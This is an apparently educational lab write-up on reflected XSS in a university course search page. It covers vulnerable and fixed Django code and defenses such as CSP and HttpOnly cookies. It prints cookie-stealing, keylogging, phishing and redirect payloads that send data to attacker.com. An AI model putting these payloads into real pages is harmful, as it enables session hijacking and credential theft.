---
title: Task 2 - Reflected XSS
date: 2025-10-19 00:00:00 +0000
categories: [Gatech, Courses]
hidden: true
published: false
tags: [xss, reflected-xss, output-encoding, input-validation]
toc: true
---

## Background

Reflected Cross-Site Scripting (XSS) is one of the most common web vulnerabilities. It occurs when user-supplied input is immediately reflected back in the server's response without proper sanitization or encoding. The malicious script executes in the victim's browser when they visit a crafted URL, allowing the attacker to perform actions in the context of the trusted website.

Unlike **Stored XSS** (where the payload is saved in a database), reflected XSS requires the victim to click a malicious link. However, this is often trivial to achieve through phishing emails, social media, or search engine manipulation.

## The Vulnerability

The target application had a search feature that displayed the search term back to the user. When a user searched for "test", the results page would show:

```html
<div class="search-results">
  <h2>Search results for: test</h2>
  <!-- ... results ... -->
</div>
```

The vulnerability existed because the server-side code directly embedded the search term into the HTML without any output encoding:

```python
# Vulnerable server-side code (Django example)
def search(request):
    keyword = request.GET.get('keyword', '')
    html = f'<h2>Search results for: {keyword}</h2>'
    return HttpResponse(html)
```

## Approach

The attack strategy was straightforward:

1. **Identify the reflection point** - Find where user input appears in the response
2. **Test for sanitization** - Check if HTML/JavaScript is filtered or encoded
3. **Craft the payload** - Create a malicious script that executes when reflected
4. **Construct the URL** - Build a shareable link containing the payload

## Implementation

### Step 1: Identify the Injection Point

The search functionality was accessible at:

```
https://cs6262.gtisc.gatech.edu/search?keyword=<USER_INPUT>
```

Testing with a simple string:

```
https://cs6262.gtisc.gatech.edu/search?keyword=hello
```

The response included:

```html
<div>You searched for: hello</div>
```

This confirmed the `keyword` parameter was reflected in the response.

### Step 2: Test for XSS

The next step was to test if HTML was interpreted or escaped. I tried:

```
https://cs6262.gtisc.gatech.edu/search?keyword=<b>test</b>
```

If the output showed **test** in bold, the application was vulnerable. If it showed the literal text `<b>test</b>`, the application was properly encoding output.

In this case, the HTML was rendered, confirming the vulnerability.

### Step 3: Craft the Payload

For a proof-of-concept, the standard XSS payload is:

```html
<script>
  alert(1);
</script>
```

This payload:

- Uses a `<script>` tag to execute JavaScript
- Calls `alert(1)` to display a popup
- Proves code execution in the victim's browser

### Step 4: Construct the Final URL

The complete exploit URL was:

```
https://cs6262.gtisc.gatech.edu/search?keyword=<script>alert(1)</script>
```

When a user visits this URL:

1. Browser sends GET request: `GET /search?keyword=<script>alert(1)</script>`
2. Server processes the request and includes the keyword in the response
3. Response contains: `<div>You searched for: <script>alert(1)</script></div>`
4. Browser parses the HTML and executes the script
5. Alert box appears with the number `1`

## Why It Works

### The Attack Flow

```
┌─────────────┐
│   Attacker  │
│   crafts    │
│ malicious   │
│     URL     │
└──────┬──────┘
       │
       │ Sends URL to victim
       │ (via email, social media, etc.)
       ▼
┌─────────────┐
│   Victim    │
│   clicks    │
│    link     │
└──────┬──────┘
       │
       │ GET /search?keyword=<script>alert(1)</script>
       ▼
┌─────────────┐
│   Server    │
│  reflects   │
│   payload   │
└──────┬──────┘
       │
       │ Response: <div>You searched for: <script>alert(1)</script></div>
       ▼
┌─────────────┐
│   Browser   │
│  executes   │
│   script    │
└──────┬──────┘
       │
       ▼
    alert(1)
```

### The Root Cause

The vulnerability exists because of **insufficient output encoding**. The server treats user input as trusted data and embeds it directly into HTML. The browser, when parsing the response, interprets the `<script>` tag as legitimate code and executes it.

### Secure vs. Vulnerable Code

**Vulnerable (Python/Django):**

```python
keyword = request.GET.get('keyword', '')
html = f'<div>You searched for: {keyword}</div>'
return HttpResponse(html)
```

**Secure (Python/Django):**

```python
from django.utils.html import escape

keyword = request.GET.get('keyword', '')
html = f'<div>You searched for: {escape(keyword)}</div>'
return HttpResponse(html)
```

The `escape()` function converts special characters to HTML entities:

- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `"` becomes `&quot;`
- `'` becomes `&#x27;`
- `&` becomes `&amp;`

So `<script>alert(1)</script>` becomes:

```
&lt;script&gt;alert(1)&lt;/script&gt;
```

This displays as text rather than executing as code.

## Beyond alert(1)

While `alert(1)` proves the vulnerability exists, real attackers would use more sophisticated payloads:

### Cookie Theft

```javascript
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>
```

This sends the victim's cookies (including session tokens) to the attacker's server.

### Keylogging

```javascript
<script>
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
});
</script>
```

This captures every keystroke the victim types on the page.

### Phishing

```javascript
<script>
document.body.innerHTML = '<form action="https://attacker.com/phish">' +
    '<h2>Session Expired - Please Login</h2>' +
    'Username: <input name="user"><br>' +
    'Password: <input type="password" name="pass"><br>' +
    '<input type="submit" value="Login">' +
    '</form>';
</script>
```

This replaces the entire page with a fake login form that sends credentials to the attacker.

### Redirecting

```javascript
<script>window.location = 'https://attacker.com/malware';</script>
```

This redirects the victim to a malicious site that could serve malware or further phishing attacks.

## Defense Mechanisms

### 1. Output Encoding

**Always encode user input before including it in HTML.** Use context-appropriate encoding:

- **HTML context:** Encode `<`, `>`, `"`, `'`, `&`
- **JavaScript context:** Use JSON encoding
- **URL context:** Use URL encoding
- **CSS context:** Avoid user input in CSS, or use strict validation

### 2. Content Security Policy (CSP)

CSP is a browser security feature that restricts where scripts can be loaded from:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

This policy:

- Only allows scripts from the same origin (`'self'`)
- Allows scripts from `https://trusted.cdn.com`
- **Blocks inline scripts** like `<script>alert(1)</script>`

Even if an attacker injects a script tag, the browser refuses to execute it.

### 3. Input Validation

While **output encoding is the primary defense**, input validation provides defense-in-depth:

```python
import re

keyword = request.GET.get('keyword', '')

# Reject input containing script tags
if re.search(r'<script', keyword, re.IGNORECASE):
    return HttpResponse('Invalid input', status=400)
```

**Important:** Input validation alone is insufficient because:

- Attackers can use other tags: `<img>`, `<iframe>`, `<svg>`
- Attackers can use event handlers: `<div onload="alert(1)">`
- Encoding rules are complex and easy to bypass

### 4. HTTPOnly Cookies

While this doesn't prevent XSS, it limits the damage:

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly`: JavaScript can't access the cookie via `document.cookie`
- `Secure`: Cookie only sent over HTTPS
- `SameSite=Strict`: Cookie not sent on cross-site requests

This prevents cookie theft, though XSS can still perform actions on behalf of the user.

### 5. X-XSS-Protection Header

```http
X-XSS-Protection: 1; mode=block
```

This header enables the browser's built-in XSS filter. However, it's **deprecated** in modern browsers in favor of CSP.

## Real-World Impact

Reflected XSS has been used in numerous high-profile attacks:

- **2014 - eBay:** Reflected XSS allowed attackers to steal user credentials
- **2015 - Yahoo:** XSS vulnerability in Yahoo Mail enabled account compromise
- **2018 - British Airways:** XSS was part of a supply chain attack that stole 380,000 payment cards

The OWASP Top 10 consistently ranks XSS as one of the most critical web application security risks.

## Key Takeaways

1. **Never trust user input** - All input is potentially malicious
2. **Output encoding is mandatory** - Encode data based on context (HTML, JS, URL, CSS)
3. **Defense in depth** - Use multiple layers: encoding, CSP, HTTPOnly cookies, input validation
4. **Context matters** - Different contexts require different encoding strategies
5. **Test thoroughly** - Use automated scanners and manual testing to find XSS vulnerabilities

## Conclusion

Reflected XSS is a straightforward vulnerability with serious consequences. The fix is simple—proper output encoding—yet it remains prevalent because developers often forget to encode output or use incorrect encoding for the context. Understanding how reflected XSS works is the first step toward building more secure web applications and recognizing when applications are vulnerable to attack.
